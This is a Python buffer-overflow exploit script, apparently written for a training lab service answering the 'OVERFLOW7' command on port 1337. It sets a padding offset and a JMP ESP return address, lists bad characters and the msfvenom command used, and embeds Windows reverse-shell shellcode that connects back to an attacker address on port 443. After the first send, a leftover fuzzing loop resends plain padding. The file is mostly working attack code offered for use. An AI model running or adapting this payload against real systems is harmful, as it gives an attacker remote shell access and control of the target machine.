#!/usr/bin/python

import socket, time, sys

remoteip="10.10.100.198"
remoteport=1337
prefix = "OVERFLOW7 "
size = 1306
offset= "A" * size
#jmpesp 625011AF
eip= "\xaf\x11\x50\x62"
#badchars \x00\x8c\xae\xbe\xfb
#msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\x8c\xae\xbe\xfb" -v esp -f python
esp =  b"\x90" * 16
esp += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
esp += b"\x76\x0e\x81\x2d\x38\x3e\x83\xee\xfc\xe2\xf4\x7d\xc5"
esp += b"\xba\x3e\x81\x2d\x58\xb7\x64\x1c\xf8\x5a\x0a\x7d\x08"
esp += b"\xb5\xd3\x21\xb3\x6c\x95\xa6\x4a\x16\x8e\x9a\x72\x18"
esp += b"\xb0\xd2\x94\x02\xe0\x51\x3a\x12\xa1\xec\xf7\x33\x80"
esp += b"\xea\xda\xcc\xd3\x7a\xb3\x6c\x91\xa6\x72\x02\x0a\x61"
esp += b"\x29\x46\x62\x65\x39\xef\xd0\xa6\x61\x1e\x80\xfe\xb3"
esp += b"\x77\x99\xce\x02\x77\x0a\x19\xb3\x3f\x57\x1c\xc7\x92"
esp += b"\x40\xe2\x35\x3f\x46\x15\xd8\x4b\x77\x2e\x45\xc6\xba"
esp += b"\x50\x1c\x4b\x65\x75\xb3\x66\xa5\x2c\xeb\x58\x0a\x21"
esp += b"\x73\xb5\xd9\x31\x39\xed\x0a\x29\xb3\x3f\x51\xa4\x7c"
esp += b"\x1a\xa5\x76\x63\x5f\xd8\x77\x69\xc1\x61\x72\x67\x64"
esp += b"\x0a\x3f\xd3\xb3\xdc\x45\x0b\x0c\x81\x2d\x50\x49\xf2"
esp += b"\x1f\x67\x6a\xe9\x61\x4f\x18\x86\xd2\xed\x86\x11\x2c"
esp += b"\x38\x3e\xa8\xe9\x6c\x6e\xe9\x04\xb8\x55\x81\xd2\xed"
esp += b"\x6e\xd1\x7d\x68\x7e\xd1\x6d\x68\x56\x6b\x22\xe7\xde"
esp += b"\x7e\xf8\xaf\x54\x84\x45\x32\x33\xaf\xf4\x50\x3c\x81"
esp += b"\x2c\x83\xb7\x67\x47\x28\x68\xd6\x45\xa1\x9b\xf5\x4c"
esp += b"\xc7\xeb\x04\xed\x4c\x32\x7e\x63\x30\x4b\x6d\x45\xc8"
esp += b"\x8b\x23\x7b\xc7\xeb\xe9\x4e\x55\x5a\x81\xa4\xdb\x69"
esp += b"\xd6\x7a\x09\xc8\xeb\x3f\x61\x68\x63\xd0\x5e\xf9\xc5"
esp += b"\x09\x04\x3f\x80\xa0\x7c\x1a\x91\xeb\x38\x7a\xd5\x7d"
esp += b"\x6e\x68\xd7\x6b\x6e\x70\xd7\x7b\x6b\x68\xe9\x54\xf4"
esp += b"\x01\x07\xd2\xed\xb7\x61\x63\x6e\x78\x7e\x1d\x50\x36"
esp += b"\x06\x30\x58\xc1\x54\x96\xd8\x23\xab\x27\x50\x98\x14"
esp += b"\x90\xa5\xc1\x54\x11\x3e\x42\x8b\xad\xc3\xde\xf4\x28"
esp += b"\x83\x79\x92\x5f\x57\x54\x81\x7e\xc7\xeb"

buffer = prefix + offset + eip + esp

while True:

    print "Fuzzing with %s bytes" % len(buffer)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, remoteport))
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    print (s.recv(1024))
    s.send(buffer + "\r\n")
    print s.recv(1024)
    s.close()
    time.sleep(1)
    size += 100
    buffer = "A" * size
    print ("-------------------------")
